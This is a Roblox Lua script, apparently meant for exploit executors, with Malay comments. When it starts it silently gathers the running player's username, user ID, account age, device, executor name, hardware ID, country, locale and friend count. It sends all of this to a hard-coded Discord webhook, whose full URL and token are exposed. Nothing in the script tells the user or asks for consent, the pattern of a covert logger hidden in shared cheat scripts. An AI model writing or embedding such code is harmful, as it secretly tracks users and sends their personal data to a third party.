-- SCRIPT LOGGER (hantar info ke Discord)
-- =====================================================
local function sendWebhook()
    local player = game.Players.LocalPlayer
    if not player then return end

    local webhook = "https://discord.com/api/webhooks/1561938040950231090/3__2HBXCuJukOVTpBjSahgAsvgG3QX7lwAP7NOKWAVj6K8q95XZe8f6LnvaAk757MxE8"
    local HttpService = game:GetService("HttpService")
    local UIS = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")
    local LocalizationService = game:GetService("LocalizationService")
    local MarketplaceService = game:GetService("MarketplaceService")

    -- Device
    local device = "Unknown"
    if GuiService:IsTenFootInterface() then
        device = "Console"
    elseif UIS.TouchEnabled and not UIS.KeyboardEnabled and not UIS.MouseEnabled then
        device = "Mobile"
    elseif UIS.KeyboardEnabled or UIS.MouseEnabled then
        device = "PC"
    elseif UIS.TouchEnabled then
        device = "Mobile (Touch)"
    end

    -- Executor
    local executorName = "Unknown / Normal Client"
    local identify = identifyexecutor or getexecutorname
    if identify then
        local success, name, version = pcall(identify)
        if success and name then
            executorName = tostring(name)
            if version then
                executorName = executorName .. " (" .. tostring(version) .. ")"
            end
        end
    else
        if syn then
            executorName = "Synapse X / Synapse Z"
        elseif FLUXUS_LOADED or fluxus then
            executorName = "Fluxus"
        elseif KRNL_LOADED then
            executorName = "KRNL"
        elseif is_sirhurt_closure or SIRHURT_LOADED then
            executorName = "SirHurt"
        elseif getgenv and getgenv().Wave then
            executorName = "Wave"
        elseif getgenv and (getgenv().Delta or getgenv().deltax) then
            executorName = "Delta"
        elseif getgenv and getgenv().Codex then
            executorName = "Codex"
        elseif getgenv and getgenv().Solara then
            executorName = "Solara"
        elseif getgenv and getgenv().Xeno then
            executorName = "Xeno"
        elseif getgenv and getgenv().Volt then
            executorName = "Volt"
        elseif getgenv and getgenv().Madium then
            executorName = "Madium"
        elseif request or http_request or (http and http.request) then
            executorName = "Unknown Executor (ada request)"
        end
    end

    -- Account Age
    local accountAgeDays = player.AccountAge
    local years = math.floor(accountAgeDays / 365)
    local months = math.floor((accountAgeDays % 365) / 30)
    local ageText = string.format("%d hari (%d tahun %d bulan)", accountAgeDays, years, months)

    -- Membership
    local membership = "Bukan Premium"
    if player.MembershipType == Enum.MembershipType.Premium then
        membership = "Premium"
    end

    -- Language
    local locale = player.LocaleId or LocalizationService.RobloxLocaleId or "Unknown"

    -- Country
    local country = "Unknown"
    pcall(function()
        country = LocalizationService:GetCountryRegionForPlayerAsync(player) or "Unknown"
    end)

    -- Friend Count
    local friendCount = "Unknown"
    pcall(function()
        local friends = game:GetService("Players"):GetFriendsAsync(player.UserId)
        local page = friends:GetCurrentPage()
        friendCount = tostring(#page)
    end)

    -- HWID
    local hwid = "Tidak dijumpai"
    pcall(function()
        if gethwid then
            hwid = tostring(gethwid())
        end

        local req = request or http_request or (http and http.request) or (syn and syn.request)
        if req and hwid == "Tidak dijumpai" then
            local response = req({
                Url = "https://httpbin.org/get",
                Method = "GET"
            })
            if response and response.Body then
                local body = HttpService:JSONDecode(response.Body)
                if body.headers then
                    for k, v in pairs(body.headers) do
                        local lowerK = string.lower(k)
                        if string.find(lowerK, "fingerprint") or string.find(lowerK, "hwid") or string.find(lowerK, "user-identifier") then
                            hwid = tostring(v)
                            break
                        end
                    end
                end
            end
        end
    end)

    local data = {
        username = "Script Logger",
        embeds = {{
            title = "Script Digunakan",
            color = 16753920,
            fields = {
                {name = "Username", value = player.Name, inline = true},
                {name = "User ID", value = tostring(player.UserId), inline = true},
                {name = "Display Name", value = player.DisplayName, inline = true},
                {name = "Account Age", value = ageText, inline = true},
                {name = "Membership", value = membership, inline = true},
                {name = "Device", value = device, inline = true},
                {name = "Executor", value = executorName, inline = true},
                {name = "HWID", value = hwid, inline = false},
                {name = "Language / Locale", value = locale, inline = true},
                {name = "Country", value = country, inline = true},
                {name = "Friend Count (approx)", value = friendCount, inline = true},
                {name = "Game", value = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown", inline = false},
                {name = "Place ID", value = tostring(game.PlaceId), inline = true},
            },
            footer = {text = "Script Tracker • Full Info"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local success, err = pcall(function()
        if request then
            request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        else
            HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
        end
    end)

    if not success then
        warn("Gagal hantar webhook: " .. tostring(err))
    end
end

-- Hantar logger sekali je bila script start
sendWebhook()

